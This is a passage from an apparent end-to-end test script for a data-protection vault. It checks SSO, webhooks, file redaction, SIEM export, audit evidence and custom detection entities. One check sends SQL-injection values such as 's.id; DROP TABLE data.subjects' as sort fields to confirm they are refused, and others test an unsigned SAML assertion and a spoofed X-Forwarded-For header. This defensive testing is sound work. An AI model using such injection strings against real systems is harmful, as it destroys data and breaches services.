  idpSrv.close();

  section("Single sign-on: SAML");
  const require = createRequire(`${process.env.RV_CONTROL_API_DIR}/package.json`);
  void require;
  const cert = fs.readFileSync(`${DIR}/internal-tls/edge/cert.pem`, "utf8");
  const samlPut = await control("/v1/settings/sso", { method: "PUT", token: ADMIN, body: { kind: "saml", email_domains: ["e2e.example.ng"], idp_sso_url: "https://idp.example.com/sso", idp_cert: cert, sp_entity_id: "rv-sp", idp_enforces_mfa: true } });
  check("SAML configures", samlPut.status === 200, samlPut.text);
  const samlResponse = (email) => {
    const now = new Date(), later = new Date(Date.now() + 300000), id = `_${crypto.randomBytes(8).toString("hex")}`;
    const dest = "https://localhost:8443/api/session/sso";
    const assertion = `<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="${id}" Version="2.0" IssueInstant="${now.toISOString()}"><saml:Issuer>idp</saml:Issuer><saml:Subject><saml:NameID>${email}</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="${later.toISOString()}" Recipient="${dest}"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="${new Date(Date.now() - 60000).toISOString()}" NotOnOrAfter="${later.toISOString()}"><saml:AudienceRestriction><saml:Audience>rv-sp</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AuthnStatement AuthnInstant="${now.toISOString()}"/></saml:Assertion>`;
    return { assertion, id };
  };
  const samlState = async () => new URL((await control("/v1/auth/sso/start", { body: { email: "ssouser@e2e.example.ng" } })).json.redirect).searchParams.get("RelayState");
  const unsigned = Buffer.from(`<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_r" Version="2.0" IssueInstant="${new Date().toISOString()}"><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>${samlResponse("ssouser@e2e.example.ng").assertion}</samlp:Response>`).toString("base64");
  check("SAML refuses an unsigned assertion", (await control("/v1/auth/sso/saml", { body: { SAMLResponse: unsigned, RelayState: await samlState() } })).status === 401);
  check("SAML refuses a bad relay state", (await control("/v1/auth/sso/saml", { body: { SAMLResponse: unsigned, RelayState: "nope" } })).status === 401);
  await control("/v1/settings/sso", { method: "DELETE", token: ADMIN });
}

section("Support tools");
{
  const vendorCalls = [];
  const vendor = http.createServer((q, s) => { const c = []; q.on("data", (d) => c.push(d)); q.on("end", () => { vendorCalls.push({ method: q.method, url: q.url, auth: q.headers.authorization, body: Buffer.concat(c).toString() }); s.writeHead(200, { "content-type": "application/json" }); s.end("{}"); }); });
  await new Promise((r) => vendor.listen(18996, "0.0.0.0", r));
  const ad = await control("/v1/adapters", { token: ADMIN, body: { vault_id: V, name: "Helpdesk", kind: "freshdesk", base_url: "http://host.docker.internal:18996", token: "vendor-api-key" } });
  check("a support tool connects, in shadow mode", ad.status === 200 && ad.json.webhook_secret?.startsWith("rvw_"), ad.text);
  check("the vendor credential never comes back", !(await control("/v1/adapters", { token: ADMIN })).text.includes("vendor-api-key"));
  await sleep(6000);
  const hook = (body, secret = ad.json.webhook_secret) => req(`/support/${ad.json.id}/webhook`, { body, headers: { "x-rv-webhook-secret": secret } });
  check("a wrong webhook secret is refused", (await hook({ ticket_id: 1, description: "x" }, "wrong")).status === 401);
  check("shadow mode counts and writes nothing", (await hook({ ticket_id: 7, description: `BVN ${BVN}` })).status === 200 && vendorCalls.length === 0);
  await control(`/v1/adapters/${ad.json.id}`, { method: "PATCH", token: ADMIN, body: { mode: "enforcing" } });
  await sleep(6000);
  const wrote = await hook({ ticket_id: 7, description: `My BVN is ${BVN}, please help` });
  const vc = vendorCalls.at(-1);
  check("enforcing writes tokenized text back", wrote.status === 200 && vc?.method === "PUT" && vc.url === "/api/v2/tickets/7" && !vc.body.includes(BVN) && vc.body.includes("tok_bvn_"), vc?.body);
  vendor.close();
}

section("Files");
{
  const { createRequire } = await import("node:module");
  const PDFDocument = createRequire(`${process.env.RV_CONTROL_API_DIR}/package.json`)("pdfkit");
  const makePdf = (lines) => new Promise((resolve) => { const d = new PDFDocument(); const c = []; d.on("data", (x) => c.push(x)); d.on("end", () => resolve(Buffer.concat(c))); d.fontSize(18); for (const l of lines) d.text(l).moveDown(); d.end(); });
  const put = (body, token = ADMIN, purpose = "File test") => fetch(`${BASE}/files/${V}/redact`, { method: "POST", headers: { authorization: `Bearer ${token}`, "x-rv-purpose": purpose, "content-type": "application/octet-stream" }, body });
  const FILE_BVN = "22888899901";
  const pdf = await makePdf(["Customer statement", `BVN: ${FILE_BVN}`, "Thank you for banking with us"]);
  check("a file needs a token", (await fetch(`${BASE}/files/${V}/redact`, { method: "POST", body: pdf })).status === 401);
  check("a file needs permission", (await put(pdf, sade.token)).status === 403);
  check("an unknown binary is refused rather than passed", (await put(Buffer.from([0x4d, 0x5a, 0, 0, 1, 2]))).status === 415);
  const out = await put(pdf);
  const outBytes = Buffer.from(await out.arrayBuffer());
  const findings = JSON.parse(out.headers.get("x-rv-findings") ?? "{}");
  check("a PDF comes back redacted", out.status === 200 && findings.bvn >= 1 && outBytes.subarray(0, 5).toString() === "%PDF-", `${out.status} ${JSON.stringify(findings)}`);
  check("the output PDF holds no text layer or original value", !outBytes.toString("latin1").includes(FILE_BVN) && !outBytes.toString("latin1").includes("/Font"));
  const again = await put(outBytes);
  const againF = JSON.parse(again.headers.get("x-rv-findings") ?? "{}");
  await again.arrayBuffer(); // An unread body holds the HTTP/2 flow-control window, which stalls later requests.
  check("OCR on the redacted PDF finds no BVN any more", again.status === 200 && !againF.bvn, JSON.stringify(againF));
  const pngPath = `${DIR}/e2e-page.png`, pdfPath = `${DIR}/e2e-page.pdf`, aiffPath = `${DIR}/e2e-say.aiff`;
  fs.writeFileSync(pdfPath, pdf);
  try {
    sh(`sips -s format png ${pdfPath} --out ${pngPath}`);
    const img = await put(fs.readFileSync(pngPath));
    const imgF = JSON.parse(img.headers.get("x-rv-findings") ?? "{}");
    await img.arrayBuffer();
    check("an image comes back redacted", img.status === 200 && imgF.bvn >= 1 && img.headers.get("content-type") === "image/jpeg", `${img.status} ${JSON.stringify(imgF)}`);
  } catch { console.log("  skip  image check: sips is not available here"); }
  try {
    sh(`say -o ${aiffPath} "Hello, my phone number is zero eight zero three five five five one two one two. Thank you."`);
    const a = await put(fs.readFileSync(aiffPath));
    const ad = await a.json();
    console.log(`        transcript: ${(ad.transcript ?? "").trim().slice(0, 120)}`);
    check("a recording comes back with the number gone from the transcript", a.status === 200 && !/0803|803555/.test(ad.transcript ?? "") && Boolean(ad.audio_wav), JSON.stringify(ad).slice(0, 160));
    const f = JSON.parse(a.headers.get("x-rv-findings") ?? "{}");
    check("the phone number was found in speech", f.phone_ng >= 1, JSON.stringify(f));
  } catch (e) { console.log(`  skip  audio check: ${e.message ?? e}`); }
  for (const p of [pngPath, pdfPath, aiffPath]) fs.rmSync(p, { force: true });
  check("file redaction is audited, with counts and no values", (await control("/v1/audit-events?action=file_redact&limit=20", { token: ADMIN })).json.events.some((e) => (e.detail ?? "").includes("findings")));
}

section("SIEM and signed audit export");
{
  const siemBatches = [];
  const siem = http.createServer((q, s) => { const c = []; q.on("data", (d) => c.push(d)); q.on("end", () => { siemBatches.push({ sig: q.headers["x-rv-signature"], body: Buffer.concat(c).toString() }); s.writeHead(200); s.end(); }); });
  await new Promise((r) => siem.listen(18995, "0.0.0.0", r));
  const set = await control("/v1/settings", { method: "PATCH", token: ADMIN, body: { siem_url: "http://host.docker.internal:18995/ingest" } });
  check("a SIEM endpoint configures, with a one-time secret", set.status === 200 && Boolean(set.json.siem_secret), set.text);
  for (let i = 0; i < 45 && siemBatches.length === 0; i++) await sleep(1000);
  const first = siemBatches[0];
  check("audit events reach the SIEM, signed", first && first.sig === `sha256=${crypto.createHmac("sha256", set.json.siem_secret).update(first.body).digest("hex")}`);
  check("the SIEM copy holds no values", first && !first.body.includes(BVN));
  await control("/v1/settings", { method: "PATCH", token: ADMIN, body: { siem_url: null } });
  siem.close();
  const pdfA = await fetch(`${BASE}/control/v1/audit-events/export.pdf?limit=50`, { headers: { authorization: `Bearer ${ADMIN}` } });
  const pa = Buffer.from(await pdfA.arrayBuffer());
  check("the audit view exports as a signed PDF", pa.subarray(0, 5).toString() === "%PDF-");
}

section("Data subject rights");
{
  // A second person with fewer values, never accessed, so the order has something to prove.
  await sdk.tokenize(V, [{ field: "phone", value: "08035550101", subject_ref: "cust_sort_1" }]);
  const sorted = async (sort, dir) => (await req(`/v1/vaults/${V}/subjects/search`, { token: ADMIN, body: { sort, dir, limit: 200 } })).json.subjects;
  const asc = await sorted("field_count", "asc"), desc = await sorted("field_count", "desc");
  const counts = (l) => l.map((x) => x.field_count);
  check("people sort by the server, in both directions", asc.length > 1 && counts(asc).every((v, i, l) => i === 0 || l[i - 1] <= v) && counts(desc).every((v, i, l) => i === 0 || l[i - 1] >= v), JSON.stringify(counts(asc).slice(0, 20)));
  const never = (await sorted("last_accessed", "asc")).map((x) => x.last_accessed);
  const neverDesc = (await sorted("last_accessed", "desc")).map((x) => x.last_accessed);
  check("people never accessed sort last in either direction", [never, neverDesc].every((l) => l.includes(null) && l[0] !== null && l.at(-1) === null), JSON.stringify([never.slice(0, 3), neverDesc.slice(0, 3)]));
  check("a sort outside the fixed list is refused", (await req(`/v1/vaults/${V}/subjects/search`, { token: ADMIN, body: { sort: "s.id; DROP TABLE data.subjects" } })).status === 400 && (await req(`/v1/vaults/${V}/subjects/search`, { token: ADMIN, body: { sort: "field_count", dir: "asc; --" } })).status === 400);
}
const found = await req(`/v1/vaults/${V}/subjects/search`, { token: ADMIN, body: { query: BVN } });
check("exact-value search finds the person", found.json.total === 1 && found.json.subjects[0].ref === "cust_e2e_1", found.text);
const SID = found.json.subjects[0].id;
const page = await req(`/v1/vaults/${V}/subjects/${SID}`, { token: ADMIN });
{
  const reveals = async () => (await req(`/v1/vaults/${V}/subjects/search`, { token: ADMIN, body: { query: BVN } })).json.subjects[0].reveals_30d;
  const before = await reveals();
  await req(`/v1/vaults/${V}/subjects/${SID}`, { token: ADMIN });
  check("opening a person's page reads masked values, which do not count as reveals", (await reveals()) === before, String(before));
}
check("the subject page shows masks, never plaintext", !page.text.includes(BVN) && page.text.includes("*******0011"), page.text);
const exp = await req(`/v1/vaults/${V}/subjects/${SID}/export`, { token: ADMIN, headers: { "x-rv-purpose": "NDPA access request 1" } });
check("export returns the person's data", exp.text.includes(BVN), exp.text);
check("support cannot export", (await req(`/v1/vaults/${V}/subjects/${SID}/export`, { token: sade.token, headers: { "x-rv-purpose": "curious" } })).status === 403);

section("Evidence");
const chain = await control("/v1/audit-events/verify", { token: ADMIN, method: "POST" });
check("the audit chain verifies", chain.json.ok === true && chain.json.events_checked > 1000, chain.text);
const denied = await control("/v1/audit-events?decision=denied&limit=5", { token: ADMIN });
check("denials are in the audit log", denied.json.events.length > 0);
const spoofed = await control("/v1/audit-events?action=detokenize&limit=500", { token: ADMIN });
const spoofEvent = spoofed.json.events.find((e) => e.purpose === "spoof-check");
check("a client-sent X-Forwarded-For does not become the audited IP", spoofEvent && spoofEvent.source_ip !== "1.2.3.4", JSON.stringify(spoofEvent));
check("support cannot read the audit log", (await control("/v1/audit-events", { token: sade.token })).status === 403);
{
  const newest = (await control("/v1/audit-events?limit=5", { token: ADMIN })).json.events, oldest = (await control("/v1/audit-events?limit=5&order=oldest", { token: ADMIN })).json.events;
  check("audit events list newest or oldest first", Number(newest[0].seq) > Number(newest[1].seq) && Number(oldest[0].seq) < Number(oldest[1].seq));
  const nextOld = (await control(`/v1/audit-events?limit=5&order=oldest&after_seq=${oldest[4].seq}`, { token: ADMIN })).json.events;
  check("oldest-first paging continues without a gap or repeat", Number(nextOld[0].seq) > Number(oldest[4].seq));
  const sum = (await control("/v1/audit-events/summary?action=detokenize", { token: ADMIN })).json;
  check("the audit summary counts matches and lists real filter values", sum.total > 0 && sum.total <= chain.json.events_checked + 100 && sum.actions.includes("detokenize") && sum.actions.includes("reveal_denied"), JSON.stringify({ t: sum.total }));
  check("support cannot read the audit summary", (await control("/v1/audit-events/summary", { token: sade.token })).status === 403);
}
const csv = await control("/v1/audit-events/export?limit=100", { token: ADMIN });
check("audit exports as CSV", csv.status === 200 && csv.text.startsWith("seq,occurred_at"));

const from = new Date(Date.now() - 86400000).toISOString(), to = new Date(Date.now() + 60000).toISOString();
await control("/v1/scope-definitions", { token: ADMIN, body: { body: "Test scope: all fields marked in scope, per counsel note E2E." } });
const rep = await control(`/v1/reports/residency?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}`, { token: ADMIN });
check("the residency report builds", rep.status === 200 && rep.json.report.integrity.ok === true, rep.text.slice(0, 300));
const reportBody = rep.text.slice('{"report":'.length, rep.text.indexOf(',"signature":'));
const digest = crypto.createHash("sha256").update(reportBody).digest();
const pubKey = crypto.createPublicKey({ key: Buffer.concat([Buffer.from("302a300506032b6570032100", "hex"), Buffer.from(rep.json.public_key, "base64")]), format: "der", type: "spki" });
check("the report signature verifies with the audit public key", crypto.verify(null, digest, pubKey, Buffer.from(rep.json.signature, "base64")));
check("the report says it is evidence, not compliance", rep.json.report.disclaimer.includes("does not by itself establish compliance"));
check("the report shows shadow-mode passes honestly", rep.json.report.shadow_share.detections_passed_unredacted > 0);
const pdf = await fetch(`${BASE}/control/v1/reports/residency?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}&format=pdf`, { headers: { authorization: `Bearer ${ADMIN}` } });
const pdfBytes = Buffer.from(await pdf.arrayBuffer());
check("the report exports as PDF", pdfBytes.subarray(0, 5).toString() === "%PDF-" && pdfBytes.length > 2000);
fs.writeFileSync(`${DIR}/report.e2e.pdf`, pdfBytes);
const repCsv = await control(`/v1/reports/residency?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}&format=csv`, { token: ADMIN });
check("the report exports as CSV", repCsv.text.startsWith("section,key,value,count"));

section("Custom detection entities");
const LOAN = "LN-00412873", VIP = "ZX9 Merchant Seven", PIN_VALUE = "9931-KEEP-OUT", SAMPLE_SECRET = "SAMPLE-SECRET-77120";
{
  const ce = (p, o) => control(`/v1/vaults/${V}/custom-entities${p}`, o);
  const sink = []; // every outbound module posts here
  const sinkSrv = http.createServer((q, s) => { const c = []; q.on("data", (d) => c.push(d)); q.on("end", () => { sink.push({ url: q.url, body: Buffer.concat(c).toString() }); s.writeHead(200, { "content-type": "application/json" }); s.end(JSON.stringify({ choices: [{ message: { role: "assistant", content: "ok" } }] })); }); });
  await new Promise((r) => sinkSrv.listen(18993, "0.0.0.0", r));
  const pipe = await control("/v1/log-pipelines", { token: ADMIN, body: { vault_id: V, name: "Custom logs", source_type: "otlp", destination: "Sink", upstream_url: "http://host.docker.internal:18993" } });
  await control(`/v1/log-pipelines/${pipe.json.id}`, { token: ADMIN, method: "PATCH", body: { mode: "enforcing" } });
  const aiR = await control("/v1/ai-routes", { token: ADMIN, body: { vault_id: V, name: "Custom AI", provider: "mock", upstream_base_url: "http://host.docker.internal:18993/v1", allowed_models: ["gpt-test"], restore_in_response: false } });
  await control(`/v1/ai-routes/${aiR.json.id}`, { token: ADMIN, method: "PATCH", body: { mode: "enforcing" } });
  const prxR = await control("/v1/proxy-routes", { token: ADMIN, body: { vault_id: V, name: "Custom proxy", method: "POST", path_pattern: "/x/**", upstream_url: "http://host.docker.internal:18993", redact_paths: [], dlp: true } });
  await sleep(6000);
  // What each module sends onward for one piece of text.
  const viaModules = async (text) => {
    sink.length = 0;
    const logs = await req(`/logs/http/${pipe.json.id}`, { body: [{ msg: text }], headers: { "x-rv-pipeline-key": pipe.json.ingest_key } });
    const logOut = sink.at(-1)?.body ?? `(no delivery: ${logs.status})`;
    sink.length = 0;
    const ai = await req(`/ai/${aiR.json.id}/v1/chat/completions`, { body: { model: "gpt-test", messages: [{ role: "user", content: text }] }, headers: { "x-rv-route-key": aiR.json.route_key, authorization: "Bearer k" } });
    const aiOut = sink.at(-1)?.body ?? `(no delivery: ${ai.status} ${ai.text})`;
    sink.length = 0;
    const px = await req(`/proxy/${prxR.json.id}/x/y`, { body: { note: text }, headers: { "x-rv-route-key": prxR.json.route_key } });
    const pxOut = sink.at(-1)?.body ?? `(no delivery: ${px.status} ${px.text})`;
    const fileRes = await fetch(`${BASE}/files/${V}/redact`, { method: "POST", headers: { authorization: `Bearer ${ADMIN}`, "x-rv-purpose": "Custom entity test", "content-type": "application/octet-stream" }, body: Buffer.from(text) });
    return { logs: logOut, ai: aiOut, proxy: pxOut, file: await fileRes.text() };
  };
  const loanSpec = { name: "Loan ID", slug: "c_loan_id", kind: "pattern", definition: { regex: "LN-\\d{8}" }, validator: { type: "length", value: 11 }, context_positive: ["loan", "facility", "repayment"], context_negative: ["invoice"], threshold: 0.7, token_kind: "deterministic", token_format: "opaque", mask_rule: { type: "last_n", n: 4 }, actions: { api: "tokenize", logs: "tokenize", ai: "tokenize", proxy: "mask" }, tests: [{ sample: "repayment on LN-00412873 is late", expect_match: true }, { sample: "invoice INV-00412873 paid", expect_match: false }] };

  const off = await ce("", { token: ADMIN });
  check("custom entities stay off until the vault's flag is on", off.status === 403 && off.json?.error?.code === "feature_disabled", off.text);
  check("a support agent cannot turn the flag on", (await control(`/v1/vaults/${V}/detection`, { token: sade.token, method: "PATCH", body: { enabled: true } })).status === 403);
  check("an admin turns the flag on", (await control(`/v1/vaults/${V}/detection`, { token: ADMIN, method: "PATCH", body: { enabled: true } })).status === 200);
  check("a support agent cannot create an entity", (await ce("", { token: sade.token, body: loanSpec })).status === 403);
  const loan = await ce("", { token: ADMIN, body: loanSpec });
  check("a draft is created", loan.status === 201 && loan.json.status === "draft" && loan.json.version === 0, loan.text);
  check("a used slug gets slug_taken", (await ce("", { token: ADMIN, body: loanSpec })).json?.error?.code === "slug_taken");
  check("bad RE2 gets invalid_regex", (await ce("", { token: ADMIN, body: { ...loanSpec, slug: "c_bad", definition: { regex: "(?=x)y" } } })).json?.error?.code === "invalid_regex");
  check("a pattern that matches nothing at all gets entity_too_broad", (await ce("", { token: ADMIN, body: { ...loanSpec, slug: "c_empty", definition: { regex: "\\d*" } } })).json?.error?.code === "entity_too_broad");
  const LID = loan.json.id;

  // Criterion 1: a draft matches nothing outside the test bench.
  let out = await viaModules(`loan ${LOAN} is late`);
  check("criterion 1: a draft passes through all four modules untouched", Object.values(out).every((v) => v.includes(LOAN)), JSON.stringify(out));
  const bench = await ce(`/${LID}/test`, { token: ADMIN, body: { text: `repayment on ${LOAN} bvn ${BVN}` } });
  check("the test bench matches a draft and shows built-ins beside it", bench.json?.matches?.some((m) => m.type === "c_loan_id" && m.custom && m.score >= 0.9) && bench.json?.matches?.some((m) => m.type === "bvn"), bench.text);
  const samplesRun = await ce(`/${LID}/test`, { token: ADMIN, body: {} });
  check("stored samples run", samplesRun.json?.results?.length === 2 && samplesRun.json.results.every((r) => r.passed), samplesRun.text);

  // Criterion 6.
  const few = await ce(`/${LID}/publish-requests`, { token: ADMIN, body: {} });
  check("criterion 6: too few samples gets entity_test_failed", few.status === 422 && few.json.error.code === "entity_test_failed", few.text);
  await ce(`/${LID}/tests`, { token: ADMIN, body: { samples: [{ sample: "facility LN-11112222", expect_match: true }, { sample: `loan ${SAMPLE_SECRET} LN-33334444`, expect_match: true }, { sample: "plain words here", expect_match: false }, { sample: "LN-123", expect_match: false }, { sample: "this one must not match LN-55556666", expect_match: false }] } });
  const failing = await ce(`/${LID}/publish-requests`, { token: ADMIN, body: {} });
  check("criterion 6: a failing sample gets entity_test_failed, and is listed", failing.status === 422 && failing.json.error.code === "entity_test_failed" && failing.json.error.failing?.length === 1, failing.text);
  check("the failure list does not echo the sample", !failing.text.includes("LN-55556666"));
  await ce(`/${LID}/tests/${failing.json.error.failing[0].id}`, { token: ADMIN, method: "DELETE" });
  await ce(`/${LID}/tests`, { token: ADMIN, body: { samples: [{ sample: "LN-1234 only", expect_match: false }] } });
  const broad = await ce("", { token: ADMIN, body: { name: "Too broad", slug: "c_broad", kind: "pattern", definition: { regex: "[a-zA-Z0-9]+" }, threshold: 0.5, actions: {}, tests: [{ sample: "aaa", expect_match: true }, { sample: "bbb", expect_match: true }, { sample: "ccc", expect_match: true }] } });
  const broadPub = await ce(`/${broad.json.id}/publish-requests`, { token: ADMIN, body: {} });
  check("criterion 6: too few must-not-match samples blocks the broad entity first", broadPub.json?.error?.code === "entity_test_failed", broadPub.text);
  const kw = await ce("", { token: ADMIN, body: { name: "Common word", slug: "c_common", kind: "keyword_list", definition: { terms: ["the", "failed", "transfer", "to", "for", "is", "and", "my", "created", "status"] }, threshold: 0.5, actions: {}, tests: [{ sample: "the", expect_match: true }, { sample: "failed", expect_match: true }, { sample: "to", expect_match: true }, { sample: "zzz", expect_match: false }, { sample: "yyy", expect_match: false }, { sample: "xxx", expect_match: false }] } });
  const kwPub = await ce(`/${kw.json.id}/publish-requests`, { token: ADMIN, body: {} });
  check("criterion 6: matching most lines gets entity_too_broad", kwPub.json?.error?.code === "entity_too_broad" && kwPub.json.error.benchmark?.bytes >= 50 << 20, kwPub.text);

  // Criterion 7.
  const pub = await ce(`/${LID}/publish-requests`, { token: ADMIN, body: {} });
  check("a passing entity files a request, with its benchmark", pub.status === 201 && pub.json.benchmark?.bytes >= 50 << 20 && pub.json.benchmark.ms_per_kb <= 0.3, pub.text);
  console.log(`        benchmark: ${JSON.stringify(pub.json.benchmark)}`);
  const own = await control(`/v1/publish-requests/${pub.json.id}/approve`, { token: ADMIN, method: "POST" });
  check("criterion 7: the author cannot approve", own.status === 403 && own.json.error.code === "approval_required", own.text);
  check("a support agent cannot approve", (await control(`/v1/publish-requests/${pub.json.id}/approve`, { token: sade.token, method: "POST" })).status === 403);
  const t0 = Date.now();
  const ok = await control(`/v1/publish-requests/${pub.json.id}/approve`, { token: BOLA, method: "POST" });
  check("a second admin approves, and it starts in shadow", ok.status === 200 && ok.json.status === "shadow", ok.text);

  // Criterion 2: live without a restart in every service, within 30 seconds.
  let liveAfter = -1;
  for (let i = 0; i < 60 && liveAfter < 0; i++) {
    sink.length = 0;
    const d = await req("/v1/detect", { token: ADMIN, body: { text: `repayment on ${LOAN}`, vault: V, include_shadow: true } });
    const pr = await prxCallCounts(prxR, `repayment on ${LOAN}`);
    if (d.json?.entities?.some((e) => e.type === "c_loan_id") && pr) liveAfter = Date.now() - t0;
    else await sleep(500);
  }
  console.log(`        live in shadow after ${liveAfter} ms`);
  check("criterion 2: live in shadow within 30 seconds, with no restart", liveAfter >= 0 && liveAfter < 30000);
  await sleep(11000); // the longest poll, for the file redactor, which has no NOTIFY

  // Criterion 3: in shadow, everything passes unchanged and is counted.
  out = await viaModules(`repayment on ${LOAN} is late`);
  check("criterion 3: shadow leaves all four modules unchanged", Object.values(out).every((v) => v.includes(LOAN)), JSON.stringify(out));
  const shielded = await viaModules(`loan ${LOAN} bvn ${BVN}`);
  check("a shadow entity never weakens a built-in", Object.values(shielded).every((v) => !v.includes(BVN) && v.includes(LOAN)), JSON.stringify(shielded));
  const noShadow = await req("/v1/detect", { token: ADMIN, body: { text: `loan ${LOAN}`, vault: V } });
  check("/v1/detect hides shadow matches unless asked", noShadow.json.entities.every((e) => e.type !== "c_loan_id") && noShadow.json.ruleset_version > 0, noShadow.text);
  const withShadow = await req("/v1/detect", { token: ADMIN, body: { text: `loan ${LOAN}`, vault: V, include_shadow: true } });
  const se = withShadow.json.entities.find((e) => e.type === "c_loan_id");
  check("/v1/detect returns custom, entity_version and the entities filter works", se?.custom === true && se?.entity_version === 1 && (await req("/v1/detect", { token: ADMIN, body: { text: `bvn ${BVN}`, vault: V, entities: ["nin"] } })).json.entities.length === 0, withShadow.text);

  // Criterion 4: enforcing applies each module's configured action.
  check("moving to enforcing works", (await ce(`/${LID}/status`, { token: ADMIN, body: { status: "enforcing" } })).json?.status === "enforcing");
  await sleep(11000);
  out = await viaModules(`repayment on ${LOAN} is late`);
  check("criterion 4: no module forwards the value once enforcing", Object.values(out).every((v) => !v.includes(LOAN)), JSON.stringify(out));
  check("criterion 4: logs carry a tok_c_loan_id_ token", /tok_c_loan_id_[A-Za-z0-9]{22}/.test(out.logs), out.logs);
  check("criterion 4: the AI gateway sends a placeholder", /\[C_LOAN_ID_1\]/.test(out.ai), out.ai);
  check("criterion 4: the proxy applies its mask action", out.proxy.includes("*******2873"), out.proxy);
  check("criterion 4: file redaction uses the entity's mask", out.file.includes("*******2873"), out.file);
  const again = await viaModules(`repayment on ${LOAN} is late`);
  check("the token is deterministic, and a token in a log is not re-detected", (again.logs.match(/tok_c_loan_id_[A-Za-z0-9]+/) ?? [""])[0] === (out.logs.match(/tok_c_loan_id_[A-Za-z0-9]+/) ?? ["x"])[0]);
  const tokenInLog = (out.logs.match(/tok_c_loan_id_[A-Za-z0-9]+/) ?? [""])[0];
  const reLog = await viaModules(`seen ${tokenInLog}`);
  check("a custom token passes through unchanged", reLog.logs.includes(tokenInLog), reLog.logs);

  // Tokenize validates against the entity; detokenize masks by its rule.
  const tokOk = await req(`/v1/vaults/${V}/tokenize`, { token: await sdk.bearer(), body: { items: [{ field: "c_loan_id", value: LOAN }, { field: "c_loan_id", value: "not a loan" }], continue_on_error: true } });
  check("tokenize takes a valid custom value and returns tok_c_", tokOk.json?.results?.[0]?.token?.startsWith("tok_c_loan_id_"), tokOk.text);
  check("tokenize refuses a value that fails the entity's pattern", tokOk.json?.results?.[1]?.error?.code === "validation_failed", tokOk.text);

  // An edit waits beside the live version.
  const edit = await ce(`/${LID}`, { token: ADMIN, method: "PATCH", body: { definition: { regex: "NEVER-\\d{8}" } } });
  check("editing a published entity leaves a draft version beside the live one", edit.json?.draft_version === 2 && edit.json?.version === 1, edit.text);
  await sleep(11000);
  check("the pending edit changes nothing in traffic", (await viaModules(`repayment on ${LOAN}`)).logs.includes("tok_c_loan_id_"));
  const live = await ce(`/${LID}`, { token: ADMIN });
  check("the live definition stays readable beside the draft", live.json.entity.definition.regex === "LN-\\d{8}" && live.json.pending_definition.definition.regex === "NEVER-\\d{8}", live.text);
  await ce(`/${LID}`, { token: ADMIN, method: "PATCH", body: { definition: { regex: "LN-\\d{8}" }, actions: { logs: "drop" } } });
  const req2 = await ce(`/${LID}/publish-requests`, { token: ADMIN, body: {} });
  check("an edit can be published", req2.status === 201, req2.text);
  check("a person who wrote the change cannot approve it", (await control(`/v1/publish-requests/${req2.json.id}/approve`, { token: ADMIN, method: "POST" })).json?.error?.code === "approval_required");
  const v2 = await control(`/v1/publish-requests/${req2.json.id}/approve`, { token: BOLA, method: "POST" });
  check("an edit keeps enforcing, so a fix never drops protection", v2.json?.status === "enforcing" && v2.json?.version === 2, v2.text);
  await sleep(11000);
  sink.length = 0;
  await req(`/logs/http/${pipe.json.id}`, { body: [{ msg: `repayment on ${LOAN}` }, { msg: "keep this record" }], headers: { "x-rv-pipeline-key": pipe.json.ingest_key } });
  check("a drop action removes the record from logs", !sink.at(-1)?.body.includes(LOAN) && sink.at(-1)?.body.includes("keep this record"), sink.at(-1)?.body);

  // The other kinds, through real traffic.
  const publish = async (spec) => {
    const c = await ce("", { token: ADMIN, body: spec });
    const r = await ce(`/${c.json.id}/publish-requests`, { token: ADMIN, body: {} });
    const a = await control(`/v1/publish-requests/${r.json?.id}/approve`, { token: BOLA, method: "POST" });
    await ce(`/${c.json.id}/status`, { token: ADMIN, body: { status: "enforcing" } });
    return { id: c.json.id, ok: a.status === 200, text: `${c.text} ${r.text} ${a.text}` };
  };
  const tests = (yes, no) => [...yes.map((sample) => ({ sample, expect_match: true })), ...no.map((sample) => ({ sample, expect_match: false }))];
  const pinE = await publish({ name: "Text after PIN", slug: "c_pin", kind: "after_keyword", definition: { cues: ["PIN"], max_length: 20 }, threshold: 0.7, actions: {}, tests: tests(["PIN: 1234", "my PIN is 9", "PIN=abcd"], ["spinning", "no cue", "pink"]) });
  check("an after-keyword entity publishes", pinE.ok, pinE.text);
  const kwE = await publish({ name: "Codename", slug: "c_codename", kind: "keyword_list", definition: { terms: ["Project Ember"] }, threshold: 0.7, actions: {}, tests: tests(["project ember", "Project Ember update", "see PROJECT EMBER"], ["project", "ember", "embers"]) });
  check("a keyword entity publishes", kwE.ok, kwE.text);
  const pathE = await publish({ name: "Collateral ref", slug: "c_collateral", kind: "json_path", definition: { paths: ["$.loan.collateral_ref", "$..staffId"] }, actions: {}, tests: tests(['{"loan":{"collateral_ref":"X"}}', '{"a":{"staffId":"Y"}}', '{"staffId":7}'], ['{"loan":{"other":"X"}}', '{"a":1}', "collateral_ref X"]) });
  check("a JSON path entity publishes", pathE.ok, pathE.text);
  await sleep(11000);
  sink.length = 0;
  await req(`/logs/http/${pipe.json.id}`, { body: [{ msg: `my PIN: ${PIN_VALUE} ok`, loan: { collateral_ref: "COLL-SECRET-1" }, note: "project ember is on" }], headers: { "x-rv-pipeline-key": pipe.json.ingest_key } });
  const mixed = sink.at(-1)?.body ?? "";
  check("after-keyword, keyword and JSON path entities all redact in logs", !mixed.includes(PIN_VALUE) && !mixed.includes("COLL-SECRET-1") && !mixed.toLowerCase().includes("project ember") && mixed.includes("tok_c_pin_") && mixed.includes("tok_c_collateral_"), mixed);

  // Criterion 5: a 100,000-entry list in under 60 seconds, with no plaintext stored.
  const vipE = await ce("", { token: ADMIN, body: { name: "VIP customers", slug: "c_vip", kind: "value_list", definition: {}, actions: {}, tests: tests([`call ${VIP} today`, "ask zx9 merchant seven", `${VIP}.`], ["call somebody today", "zx9", "merchant"]) } });
  const csvRows = ["name", VIP, VIP, "", "x".repeat(201), ...Array.from({ length: 99995 }, (_, i) => `Customer Number ${i}`)];
  const form = new FormData();
  form.append("column", "name");
